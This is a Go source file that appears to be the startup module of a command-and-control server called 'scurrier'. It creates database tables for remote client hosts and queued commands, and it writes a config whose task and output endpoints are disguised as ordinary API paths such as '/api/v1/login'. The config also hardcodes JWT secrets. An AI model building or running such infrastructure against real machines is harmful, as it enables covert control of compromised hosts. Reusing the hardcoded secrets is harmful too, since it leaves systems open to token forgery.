package server

import (
	"fmt"
	"os"
	"path/filepath"
	"encoding/json"
	"database/sql"
	_ "github.com/mattn/go-sqlite3"
	"scurrier/config"
)




func CheckIfDirsSetup() (bool, string, error) {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return false, "", err
	}

	ProgramDir := filepath.Join(homeDir, ".scurrier")

	info, err := os.Stat(ProgramDir)

	if os.IsNotExist(err) {
		fmt.Println("[+] Setting up directorys...")
		return false, ProgramDir, nil
	} else if err != nil {
		fmt.Println("[!] Failed Checking For Dir")
		return false, "", err
	} else if !info.IsDir() {
		fmt.Println("[!] Path Exists but isnt a directory")
		return false, "", err
	}

	return true, ProgramDir, err
}


func SetupFiles(dir string) (bool, *sql.DB) {
	logsDir := filepath.Join(dir, "logs")
	dbDir   := filepath.Join(dir, "database")
	dbPath  := filepath.Join(dbDir, "scurrier.db")
	configPath := filepath.Join(dir, "config.json")

	if err := os.MkdirAll(dbDir, 0755); err != nil {
		fmt.Println("[!] Failed Making Database Dir")
		return false, nil
	}
	if err := os.MkdirAll(logsDir, 0755); err != nil {
		fmt.Println("[!] Failed Making Logs Dir")
		return false, nil
	}

	profileData := `{
		"endpoints": { 
			"getTaskEndpoint":"/api/v1/list",
			"postOutputEndpoint":"/api/v1/login",
			"refreshTokenEndpoint":"/api/v1/refresh",
			"RegisterEndpoint":"/api/v1/register"
		},
		"jwt_secret":"324j432j44n432423jn4242",
		"jwt_refresh_secret":"jsddvjrerjn23j4323",
		"port":"80"
	}`

	_ = os.WriteFile(configPath, []byte(profileData), 0644)

	client_table := `CREATE TABLE IF NOT EXISTS clients(
		guid          TEXT NOT NULL,
		code_name     TEXT NOT NULL,
		username      TEXT NOT NULL,
		hostname      TEXT NOT NULL,
		ip 			  TEXT NOT NULL,
		arch 		  INT NOT NULL,
		pid 		  INT NOT NULL,
		version 	  TEXT NOT NULL,
		last_checkin  TEXT NOT NULL)`
	commands_table := `CREATE TABLE IF NOT EXISTS commands(
		guid 		  TEXT NOT NULL,
		code 		  INT NOT NULL,
		param1 		  TEXT NOT NULL,
		param2 		  TEXT NOT NULL,
		command_id    INT NOT NULL,
		executed 	  INT NOT NULL,
		tasked_at 	  TEXT NOT NULL
	)`

	db, err := sql.Open("sqlite3", dbPath)
	if err != nil {
		fmt.Println("[!] Failed Opening Database")
		return false, nil
	}

	db.Exec(client_table)
	db.Exec(commands_table)
	fmt.Printf("[*] Database Created: %s\n", dbPath)
	fmt.Printf("[*] Config File: %s\n", configPath)


	return true, db



}


func ParseConfig(s *Server, path string) bool {
	file, err := os.Open(path)
	if err != nil {
		fmt.Println("[!] Failed Opening Config")
		return false
	}
	defer file.Close()

	cfg := &config.Config{}
	if err := json.NewDecoder(file).Decode(cfg); err != nil {
		fmt.Println("[!] Failed Decoding Config json")
		fmt.Println(err)
		return false
	} 
	s.Config = cfg
	return true
}


func HandleStartup(s *Server) bool {
	check, programDir, err := CheckIfDirsSetup()
	if err != nil {
		fmt.Println("Error checking directories:", err)
		return false
	}

	if !check {
		check2, db := SetupFiles(programDir)
		if check2 {
			s.DB = db
		} else {
			fmt.Println("SetupFiles failed.")
			return false
		}
	}

	dbDir := filepath.Join(programDir, "database")
	configPath := filepath.Join(programDir, "config.json")
	dbPath := filepath.Join(dbDir, "scurrier.db")

	if s.DB == nil {
		db, err := sql.Open("sqlite3", dbPath)
		if err != nil {
			fmt.Println("Error opening database:", err)
			return false
		}
		s.DB = db
	}

	if !ParseConfig(s, configPath) {
		return false
	}
	return true
}
